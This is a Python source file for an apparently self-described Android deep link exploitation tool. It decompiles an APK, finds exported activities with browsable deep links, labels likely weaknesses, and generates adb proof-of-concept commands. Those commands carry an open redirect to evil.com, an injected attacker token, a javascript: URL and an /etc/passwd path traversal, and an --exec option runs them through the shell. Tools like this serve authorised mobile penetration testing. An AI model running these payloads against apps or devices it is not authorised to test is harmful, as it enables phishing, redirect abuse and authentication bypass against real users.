import xml.etree.ElementTree as ET
import subprocess
import argparse
import os
import shutil
import sys

def banner():
    print(r"""
██████╗ ███████╗███████╗██████╗       ██████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗      ██╔════╝
██║  ██║█████╗  █████╗  ██████╔╝ ██   ██║     
██║  ██║██╔══╝  ██╔══╝  ██╔═══╝       ██║     
██████╔╝███████╗███████╗██║          ╚██████╗
╚═════╝ ╚══════╝╚══════╝╚═╝           ╚═════╝

   Android Deep Link Exploitation Framework Ⓒ Kishor Balan
   Decompile • Detect • Abuse • Exploit (adb)
   
   --------------------------------
 Android Deep Link Exploiter
--------------------------------
 • APK Auto-Decompilation
 • Insecure Deeplink Discovery
 • Exported Component Abuse
 • WebView & Redirect Attacks
 • adb PoC Generation
--------------------------------
Usage: python3 scan.py -a <target.apk>
   
""")
banner()

ANDROID_NS = "{http://schemas.android.com/apk/res/android}"

SENSITIVE_PATHS = ["login", "reset", "verify", "payment", "wallet", "admin"]
WEBVIEW_KEYWORDS = ["web", "browser", "url", "webview", "mainweb"]


# ---------------- APK DECOMPILATION ---------------- #

def decompile_apk(apk_path, out_dir):
    if not os.path.exists(apk_path):
        print("[-] APK not found")
        sys.exit(1)

    if os.path.exists(out_dir):
        shutil.rmtree(out_dir)

    print("[*] Decompiling APK using apktool...")
    cmd = ["apktool", "d", apk_path, "-o", out_dir, "-f"]
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    manifest = os.path.join(out_dir, "AndroidManifest.xml")
    if not os.path.exists(manifest):
        print("[-] Failed to extract AndroidManifest.xml")
        sys.exit(1)

    print("[+] APK decompiled successfully\n")
    return manifest


# ---------------- MANIFEST PARSING ---------------- #

def parse_manifest(path):
    tree = ET.parse(path)
    root = tree.getroot()
    return root, root.attrib.get("package")


def is_exported(component):
    exported = component.attrib.get(ANDROID_NS + "exported")
    if exported is None:
        return component.find("intent-filter") is not None
    return exported.lower() == "true"


def looks_like_webview(activity):
    return any(k in activity.lower() for k in WEBVIEW_KEYWORDS)


def extract_deeplinks(activity):
    deeplinks = []

    for intent in activity.findall("intent-filter"):
        actions = [a.attrib.get(ANDROID_NS + "name") for a in intent.findall("action")]
        categories = [c.attrib.get(ANDROID_NS + "name") for c in intent.findall("category")]

        if "android.intent.action.VIEW" not in actions:
            continue
        if "android.intent.category.BROWSABLE" not in categories:
            continue

        for data in intent.findall("data"):
            deeplinks.append({
                "scheme": data.attrib.get(ANDROID_NS + "scheme"),
                "host": data.attrib.get(ANDROID_NS + "host"),
                "path": data.attrib.get(ANDROID_NS + "path"),
                "pathPrefix": data.attrib.get(ANDROID_NS + "pathPrefix"),
                "pathPattern": data.attrib.get(ANDROID_NS + "pathPattern"),
            })

    return deeplinks


# ---------------- RISK ANALYSIS ---------------- #

def analyze_risks(activity, deeplink):
    risks = set()
    attacks = set()

    scheme = deeplink.get("scheme")
    host = deeplink.get("host")
    path = deeplink.get("path") or deeplink.get("pathPrefix") or deeplink.get("pathPattern") or "/"

    if scheme and scheme not in ["http", "https"]:
        risks.add("Custom scheme allows intent hijacking")
        attacks.add("Intent hijacking / phishing")

    if scheme in ["http", "https"] and not host:
        risks.add("Missing host allows arbitrary domains")
        attacks.add("Open redirect / malicious URL")

    for p in SENSITIVE_PATHS:
        if p in path.lower():
            risks.add(f"Sensitive functionality exposed via deep link ({p})")
            attacks.add("Authentication / authorization bypass")

    if looks_like_webview(activity):
        risks.add("WebView-based activity exposed")
        attacks.add("WebView URL injection")

    return risks, attacks


# ---------------- PoC GENERATION ---------------- #

def generate_urls(deeplink):
    scheme = deeplink.get("scheme") or "https"
    host = deeplink.get("host") or "evil.com"
    path = deeplink.get("path") or deeplink.get("pathPrefix") or "/"

    return [
        f"{scheme}://{host}{path}",
        f"{scheme}://{host}{path}?redirect=https://evil.com",
        f"{scheme}://{host}{path}?token=ATTACKER",
        f"javascript:alert(1)",
        f"{scheme}://{host}/../../../../etc/passwd"
    ]


def generate_pocs(package, activity, deeplink):
    pocs = []

    for url in generate_urls(deeplink):
        pocs.append(f"""adb shell am start \\
 -a android.intent.action.VIEW \\
 -d "{url}"
""")

    pocs.append(f"""adb shell am start \\
 -n {package}/{activity}
""")

    return pocs


# ---------------- MAIN ENGINE ---------------- #

def main():
    parser = argparse.ArgumentParser(description="Android Deep Link Exploitation Tool")
    parser.add_argument("-a", "--apk", required=True, help="Path to APK file")
    parser.add_argument("--exec", action="store_true", help="Execute PoCs via adb")
    args = parser.parse_args()

    out_dir = "apktool_out"
    manifest_path = decompile_apk(args.apk, out_dir)

    root, package = parse_manifest(manifest_path)
    print(f"[+] Package Identified: {package}\n")

    for app in root.findall("application"):
        for activity in app.findall("activity"):
            name = activity.attrib.get(ANDROID_NS + "name")
            if not name or not is_exported(activity):
                continue

            deeplinks = extract_deeplinks(activity)
            if not deeplinks:
                continue

            print("[+] Exported Activity Found:")
            print(f"    - {name}\n")

            for deeplink in deeplinks:
                print("[+] Deep Link Detected:")
                print(f"    Scheme : {deeplink.get('scheme')}")
                print(f"    Host   : {deeplink.get('host')}")
                print(f"    Path   : {deeplink.get('path') or deeplink.get('pathPrefix')}\n")

                risks, attacks = analyze_risks(name, deeplink)

                print("[!] Risk Identified:")
                for r in risks:
                    print(f"    - {r}")

                print("\n[+] Possible Attacks:")
                for a in attacks:
                    print(f"    - {a}")

                print("\n[+] PoCs:")
                for poc in generate_pocs(package, name, deeplink):
                    print(poc)
                    if args.exec:
                        subprocess.run(poc, shell=True)

                print("-" * 70)


if __name__ == "__main__":
    main()
